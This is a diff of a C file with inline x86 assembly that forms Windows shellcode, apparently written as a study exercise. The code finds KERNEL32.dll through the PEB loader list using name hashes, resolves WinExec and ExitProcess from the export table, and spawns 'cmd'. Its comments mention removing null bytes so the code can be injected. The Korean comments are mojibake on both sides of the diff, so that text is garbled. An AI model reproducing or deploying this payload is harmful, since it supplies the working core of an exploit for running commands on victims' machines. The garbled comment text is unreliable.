@@ -1,7 +1,7 @@
 #if 1
 
-//³Î¹ÙÀÌÆ® »èÁ¦ÇØ¾ß ÇÔ
-//¹Ì¿Ï
+//ë„ë°”ì´íŠ¸ ì‚­ì œí•´ì•¼ í•¨
+//ë¯¸ì™„
 
 
 
@@ -15,7 +15,7 @@ int main()
 
 			mov ebp, esp
 
-			//¼ÐÄÚµå°¡ º¸È£µÉ¸¸ÇÑ ÃæºÐÇÑ Å©±âÀÇ ½ºÅÃÀ» È®º¸
+			//ì…¸ì½”ë“œê°€ ë³´í˜¸ë ë§Œí•œ ì¶©ë¶„í•œ í¬ê¸°ì˜ ìŠ¤íƒì„ í™•ë³´
 			push 0x12345678
 			pop eax
 			shr eax, 16
@@ -24,46 +24,46 @@ int main()
 
 			push 0x30
 			pop eax
-			//EBX = PEB ½ÃÀÛ ÁÖ¼Ò
+			//EBX = PEB ì‹œìž‘ ì£¼ì†Œ
 			mov ebx, fs :[eax]
 
-			//EBX = PEB.Ldr ÁÖ¼Ò
+			//EBX = PEB.Ldr ì£¼ì†Œ
 			mov ebx, dword ptr[ebx + 0xc]
 
 			//EBX = Ldr.InMemoryOrderModuleList
 			mov ebx, dword ptr[ebx + 0x14]
 
-			//BaseDllNameÀÇ ¹öÆÛ ÁÖ¼Ò¸¦ °¡Á®¿È
+			//BaseDllNameì˜ ë²„í¼ ì£¼ì†Œë¥¼ ê°€ì ¸ì˜´
 			mov eax, dword ptr[ebx + 28h]
 
 		SEARCHDLL :
 
-			//eax¿¡ ºñ±³ÇØº¸·Á´Â ¹®ÀÚ¿­ ÁÖ¼Ò°¡ ÀÖÀ½
-			//ÀÎÀÚ·Î KERNEL32.dllÀÇ ÇØ½Ã °á°ú¸¦ ³Ö¾úÀ½
+			//eaxì— ë¹„êµí•´ë³´ë ¤ëŠ” ë¬¸ìžì—´ ì£¼ì†Œê°€ ìžˆìŒ
+			//ì¸ìžë¡œ KERNEL32.dllì˜ í•´ì‹œ ê²°ê³¼ë¥¼ ë„£ì—ˆìŒ
 			push 330h
 			call WORD PTR FIND
 
-				//Ã£´ø DLLÀ» Ã£Àº °æ¿ì
+				//ì°¾ë˜ DLLì„ ì°¾ì€ ê²½ìš°
 				cmp eax, 1
 				jz SEARCHFUNC
 
 
-				//¾øÀ¸¸é ´ÙÀ½ LDR_DATA_TABLE_ENTRY¸¦ Ã£¾Æº½
+				//ì—†ìœ¼ë©´ ë‹¤ìŒ LDR_DATA_TABLE_ENTRYë¥¼ ì°¾ì•„ë´„
 			FINDNEXT :
 
-			//¸®½ºÆ®¿¡¼­ ´ÙÀ½ DLLÀÇ LDR_DATA_TABLE_ENTRY¸¦ °¡Á®¿È
+			//ë¦¬ìŠ¤íŠ¸ì—ì„œ ë‹¤ìŒ DLLì˜ LDR_DATA_TABLE_ENTRYë¥¼ ê°€ì ¸ì˜´
 			mov ebx, dword ptr[ebx]
 
-				//BaseDllNameÀÇ ¹öÆÛ ÁÖ¼Ò¸¦ °¡Á®¿È
+				//BaseDllNameì˜ ë²„í¼ ì£¼ì†Œë¥¼ ê°€ì ¸ì˜´
 				mov eax, dword ptr[ebx + 28h]
 
 				jmp SEARCHDLL
 
 
-				//------------ÇÔ¼ö ±¸Çö------------------
+				//------------í•¨ìˆ˜ êµ¬í˜„------------------
 
 				//FIND(int findThisHash)
-				//ÀÎÀÚ·Î ÇØ½Ã °ªÀ» ¹ÞÀ½. EAX¿¡ ÀÖ´Â ¹®ÀÚ¿­À» hashÃ³¸®ÇÑ ÈÄ ºñ±³
+				//ì¸ìžë¡œ í•´ì‹œ ê°’ì„ ë°›ìŒ. EAXì— ìžˆëŠ” ë¬¸ìžì—´ì„ hashì²˜ë¦¬í•œ í›„ ë¹„êµ
 				/*
 				bool FIND(WCHAR * buf, int hashVal)
 				{
@@ -76,10 +76,10 @@ int main()
 			FIND:
 			call HASH_UNICODE
 
-				//ÀÎÀÚ·Î ¹ÞÀº ÇØ½Ã¿Í ºñ±³
+				//ì¸ìžë¡œ ë°›ì€ í•´ì‹œì™€ ë¹„êµ
 				cmp ecx, dword ptr[esp + 4]
 
-				//ÇØ½Ã °ªÀÌ ¸Â´Ù¸é Á¡ÇÁ
+				//í•´ì‹œ ê°’ì´ ë§žë‹¤ë©´ ì í”„
 				jz EQUAL
 
 			NOTEQUAL :
@@ -89,11 +89,11 @@ int main()
 			mov eax, 1
 
 			FINDDLLEND :
-					   //ÀÎÀÚ ½ºÅÃ Á¤¸® ÇÏ°í ³ª°¨
+					   //ì¸ìž ìŠ¤íƒ ì •ë¦¬ í•˜ê³  ë‚˜ê°
 					   ret 4
 
 
-					   //EAX¿¡ ÀÖ´Â ¹®ÀÚ¿­À» hashÃ³¸®
+					   //EAXì— ìžˆëŠ” ë¬¸ìžì—´ì„ hashì²˜ë¦¬
 					   /*
 					   int HASH_UNICODE(WCHAR * bufl)
 					   {
@@ -109,7 +109,7 @@ int main()
 				   HASH_UNICODE:
 			xor ecx, ecx
 
-				//EAX¿¡ ÀÖ´Â ¹®ÀÚ¿­À» ÀÌ¿ëÇÏ¿© hash¸¦ »ý¼º
+				//EAXì— ìžˆëŠ” ë¬¸ìžì—´ì„ ì´ìš©í•˜ì—¬ hashë¥¼ ìƒì„±
 			WHILE_NOT_NULL :
 			xor edx, edx
 				mov dx, word ptr[eax]
@@ -119,31 +119,31 @@ int main()
 				cmp word ptr[eax], 0
 				jnz WHILE_NOT_NULL
 
-				//ÇØ½Ã ¿Ï¼º, µ¹¾Æ°¨
+				//í•´ì‹œ ì™„ì„±, ëŒì•„ê°
 				ret
 
-				//_____________ÇÔ¼ö ±¸Çö_____________
+				//_____________í•¨ìˆ˜ êµ¬í˜„_____________
 
 
 
 
-				//-------------ÇÔ¼ö ÁÖ¼Ò Ã£±â¿ë ·çÆ¾--------------
+				//-------------í•¨ìˆ˜ ì£¼ì†Œ ì°¾ê¸°ìš© ë£¨í‹´--------------
 			SEARCHFUNC:
-			//DLLÀÇ PE iamge ½ÃÀÛ ÁÖ¼Ò ¾ò±â
+			//DLLì˜ PE iamge ì‹œìž‘ ì£¼ì†Œ ì–»ê¸°
 			mov ebx, dword ptr[ebx + 10h]
 				push ebx
 
-				//DOS Çì´õÀÇ e_lfanew¸¦ ¾ò¾î¿È (NT Çì´õÀÇ À§Ä¡)
+				//DOS í—¤ë”ì˜ e_lfanewë¥¼ ì–»ì–´ì˜´ (NT í—¤ë”ì˜ ìœ„ì¹˜)
 				mov ecx, dword ptr[ebx + 3Ch]
 
-				//EBX = NT Çì´õ À§Ä¡
+				//EBX = NT í—¤ë” ìœ„ì¹˜
 				add ebx, ecx
 
-				//32ºñÆ® ±âÁØÀ¸·Î, EBX = imagebase + optionalHeader.dataDirectory.exportTable.virtualAddress
+				//32ë¹„íŠ¸ ê¸°ì¤€ìœ¼ë¡œ, EBX = imagebase + optionalHeader.dataDirectory.exportTable.virtualAddress
 				mov ebx, dword ptr[ebx + 78h]
 				add ebx, dword ptr[esp]
 
-				//1) AddressOfNames Å×ÀÌºí¿¡ Á¢±Ù
+				//1) AddressOfNames í…Œì´ë¸”ì— ì ‘ê·¼
 				mov ecx, dword ptr[esp]
 				mov eax, dword ptr[esp]
 				add ecx, dword ptr[ebx + 20h]
@@ -153,42 +153,42 @@ int main()
 
 				xor esi, esi
 
-				//WinExec ÇØ½Ã¸¦ ÀÎÀÚ·Î ³ÖÀ½
+				//WinExec í•´ì‹œë¥¼ ì¸ìžë¡œ ë„£ìŒ
 				push 2b3h
 				call FIND_FUNC
 
-				//ÀûÀýÇÑ ÇÔ¼ö¸¦ Ã£Áö ¸øÇß´Ù¸é ³ª°¨
+				//ì ì ˆí•œ í•¨ìˆ˜ë¥¼ ì°¾ì§€ ëª»í–ˆë‹¤ë©´ ë‚˜ê°
 				cmp eax, 0
 				jz ENDALL
 
-				//ÀûÀýÇÑ ÇÔ¼ö¸¦ Ã£¾Ò´Ù¸é
-				//ESI¿¡ ÀÖ´Â ÀÎµ¦½º¸¦ ÀÌ¿ëÇÏ¿© AddressOfOrdinals ¹è¿­¿¡ Á¢±Ù
+				//ì ì ˆí•œ í•¨ìˆ˜ë¥¼ ì°¾ì•˜ë‹¤ë©´
+				//ESIì— ìžˆëŠ” ì¸ë±ìŠ¤ë¥¼ ì´ìš©í•˜ì—¬ AddressOfOrdinals ë°°ì—´ì— ì ‘ê·¼
 				mov edi, dword ptr[esp]
 				add edi, dword ptr[ebx + 24h]
 
-				//eax = WinExecÀÇ ¼­¼ö
+				//eax = WinExecì˜ ì„œìˆ˜
 				xor eax, eax
 				mov ax, word ptr[edi + esi * 2]
 
-				//AddressOfFunctions¿¡ Á¢±Ù
+				//AddressOfFunctionsì— ì ‘ê·¼
 				mov edi, dword ptr[esp]
 				add edi, dword ptr[ebx + 1Ch]
 
 
-				//AddressOfFunctions[eax]¿¡ Á¢±Ù
+				//AddressOfFunctions[eax]ì— ì ‘ê·¼
 				mov esi, [esp]
 				add esi, dword ptr[edi + eax * 4]
 
 
 				pop eax
-				//±¸ÇÑ WinExec ÁÖ¼Ò¸¦ ½ºÅÃ¿¡ ³Ö¾îµÒ
+				//êµ¬í•œ WinExec ì£¼ì†Œë¥¼ ìŠ¤íƒì— ë„£ì–´ë‘ 
 				push esi
 
-				//´Ù½Ã image base¸¦ ½ºÅÃ¿¡ ³ÖÀ½
-				//	ExitProcess ÁÖ¼Ò¸¦ ±¸ÇÏ±â À§ÇØ ÇÔ¼ö¸¦ ÀçÈ£ÃâÇÏ±â À§ÇÔ
+				//ë‹¤ì‹œ image baseë¥¼ ìŠ¤íƒì— ë„£ìŒ
+				//	ExitProcess ì£¼ì†Œë¥¼ êµ¬í•˜ê¸° ìœ„í•´ í•¨ìˆ˜ë¥¼ ìž¬í˜¸ì¶œí•˜ê¸° ìœ„í•¨
 				push eax
 
-				//1) AddressOfNames Å×ÀÌºí¿¡ Á¢±Ù
+				//1) AddressOfNames í…Œì´ë¸”ì— ì ‘ê·¼
 				mov ecx, dword ptr[esp]
 				mov eax, dword ptr[esp]
 				add ecx, dword ptr[ebx + 20h]
@@ -198,33 +198,33 @@ int main()
 
 				xor esi, esi
 
-				//ExitProcess ÇØ½Ã¸¦ ÀÎÀÚ·Î ³ÖÀ½
+				//ExitProcess í•´ì‹œë¥¼ ì¸ìžë¡œ ë„£ìŒ
 				push 479h
 				call FIND_FUNC
 
-				//ÀûÀýÇÑ ÇÔ¼ö¸¦ Ã£Áö ¸øÇß´Ù¸é ³ª°¨
+				//ì ì ˆí•œ í•¨ìˆ˜ë¥¼ ì°¾ì§€ ëª»í–ˆë‹¤ë©´ ë‚˜ê°
 				cmp eax, 0
 				jz ENDALL
 
-				//ÀûÀýÇÑ ÇÔ¼ö¸¦ Ã£¾Ò´Ù¸é
-				//ESI¿¡ ÀÖ´Â ÀÎµ¦½º¸¦ ÀÌ¿ëÇÏ¿© AddressOfOrdinals ¹è¿­¿¡ Á¢±Ù
+				//ì ì ˆí•œ í•¨ìˆ˜ë¥¼ ì°¾ì•˜ë‹¤ë©´
+				//ESIì— ìžˆëŠ” ì¸ë±ìŠ¤ë¥¼ ì´ìš©í•˜ì—¬ AddressOfOrdinals ë°°ì—´ì— ì ‘ê·¼
 				mov edi, dword ptr[esp]
 				add edi, dword ptr[ebx + 24h]
 
-				//eax = ExitProcessÀÇ ¼­¼ö
+				//eax = ExitProcessì˜ ì„œìˆ˜
 				xor eax, eax
 				mov ax, word ptr[edi + esi * 2]
 
-				//AddressOfFunctions¿¡ Á¢±Ù
+				//AddressOfFunctionsì— ì ‘ê·¼
 				mov edi, dword ptr[esp]
 				add edi, dword ptr[ebx + 1Ch]
 
-				//AddressOfFunctions[eax]¿¡ Á¢±Ù
+				//AddressOfFunctions[eax]ì— ì ‘ê·¼
 				mov esi, [esp]
 				add esi, dword ptr[edi + eax * 4]
 
 				pop eax
-				//±¸ÇÑ ExitProcessÁÖ¼Ò¸¦ ½ºÅÃ¿¡ ³Ö¾îµÒ
+				//êµ¬í•œ ExitProcessì£¼ì†Œë¥¼ ìŠ¤íƒì— ë„£ì–´ë‘ 
 				push esi
 
 				jmp EXPLOIT
@@ -232,44 +232,44 @@ int main()
 
 			FIND_FUNC :
 
-			//ÀÌ¸§ ¹è¿­À» ´Ù µ¹¾Ò´Ù¸é ·çÇÁ ³¡³¿
+			//ì´ë¦„ ë°°ì—´ì„ ë‹¤ ëŒì•˜ë‹¤ë©´ ë£¨í”„ ëëƒ„
 			cmp esi, edi
 				je END_FIND_FUNC
 
-				//AddressOfNames[i] Á¢±Ù -> ¹®ÀÚ¿­ ÁÖ¼Ò ¾ò¾î¿È
+				//AddressOfNames[i] ì ‘ê·¼ -> ë¬¸ìžì—´ ì£¼ì†Œ ì–»ì–´ì˜´
 				mov eax, dword ptr[esp + 8]
 				add eax, dword ptr[ecx + esi * 4]
 
-				//ECX¸¦ ÀÓ½Ã ÀúÀå¼Ò·Î »ç¿ëÇÏ±â À§ÇØ ¿ø·¡ ÀÖ´ø °ªÀ» ¹é¾÷
+				//ECXë¥¼ ìž„ì‹œ ì €ìž¥ì†Œë¡œ ì‚¬ìš©í•˜ê¸° ìœ„í•´ ì›ëž˜ ìžˆë˜ ê°’ì„ ë°±ì—…
 				push ecx
 
-				//ÇØ½Ã ¹× ºñ±³
+				//í•´ì‹œ ë° ë¹„êµ
 				call HASH_ASCII
 
-				//ÀÎÀÚ·Î ¹ÞÀº ÇØ½Ã¿Í ºñ±³
+				//ì¸ìžë¡œ ë°›ì€ í•´ì‹œì™€ ë¹„êµ
 				cmp ecx, dword ptr[esp + 8]
 
-				//ECX °ª º¹¿ø
+				//ECX ê°’ ë³µì›
 				pop ecx
 
-				//ÇØ½Ã °ªÀÌ ¸Â´Ù¸é Á¡ÇÁ
+				//í•´ì‹œ ê°’ì´ ë§žë‹¤ë©´ ì í”„
 				jz EQUAL_ASCII
 
 			NOTEQUAL_ASCII :
-			//´ÙÀ½ ÀÎµ¦½º¸¦ Ã£¾Æº½
+			//ë‹¤ìŒ ì¸ë±ìŠ¤ë¥¼ ì°¾ì•„ë´„
 			inc esi
 				mov eax, 0
 				jmp FIND_FUNC
 
 			EQUAL_ASCII :
-			//ÇÔ¼ö¸¦ Ã£¾Ò´Ù¸é
-			//³¡³¿
+			//í•¨ìˆ˜ë¥¼ ì°¾ì•˜ë‹¤ë©´
+			//ëëƒ„
 			mov eax, 1
 
 			END_FIND_FUNC :
 						  ret 4
 
-						  //EAX¿¡ ÀÖ´Â ¹®ÀÚ¿­À» hashÃ³¸®
+						  //EAXì— ìžˆëŠ” ë¬¸ìžì—´ì„ hashì²˜ë¦¬
 						  /*
 						  int HASH_ASCII(char * bufl)
 						  {
@@ -287,7 +287,7 @@ int main()
 
 			xor ecx, ecx
 
-				//EAX¿¡ ÀÖ´Â ¹®ÀÚ¿­À» ÀÌ¿ëÇÏ¿© hash¸¦ »ý¼º
+				//EAXì— ìžˆëŠ” ë¬¸ìžì—´ì„ ì´ìš©í•˜ì—¬ hashë¥¼ ìƒì„±
 			WHILE_NOT_NULL_ASCII :
 			xor edx, edx
 				mov dl, byte ptr[eax]
@@ -297,17 +297,17 @@ int main()
 				cmp byte ptr[eax], 0
 				jnz WHILE_NOT_NULL_ASCII
 
-				//ÇØ½Ã ¿Ï¼º, µ¹¾Æ°¨
+				//í•´ì‹œ ì™„ì„±, ëŒì•„ê°
 				ret
 
-				//_____________ÇÔ¼ö ÁÖ¼Ò Ã£±â¿ë ·çÆ¾_____________
+				//_____________í•¨ìˆ˜ ì£¼ì†Œ ì°¾ê¸°ìš© ë£¨í‹´_____________
 
 
 			EXPLOIT :
 
 
 
-			//'cmd'¹®ÀÚ¿­ ÁÖ¼Ò
+			//'cmd'ë¬¸ìžì—´ ì£¼ì†Œ
 			lea			eax, [esp - 4]
 
 				//'\0'
@@ -321,20 +321,20 @@ int main()
 				//'c'
 				add			ebx, 63h
 
-				//½ºÅÃ¿¡ ¹®ÀÚ¿­ ÀúÀå
+				//ìŠ¤íƒì— ë¬¸ìžì—´ ì €ìž¥
 				push ebx
 
-				//WinExec ÀÎÀÚ - SW_SHOW
+				//WinExec ì¸ìž - SW_SHOW
 				push        5
 
-				//WinExec ÀÎÀÚ - 'cmd'¹®ÀÚ¿­ ÁÖ¼Ò
+				//WinExec ì¸ìž - 'cmd'ë¬¸ìžì—´ ì£¼ì†Œ
 				push eax
 
-				//WinExec È£Ãâ
+				//WinExec í˜¸ì¶œ
 				call dword ptr[esp + 10h]
 
 
-				//ExitProcess È£Ãâ
+				//ExitProcess í˜¸ì¶œ
 
 				push        1
 				call dword ptr[esp + 0x8]
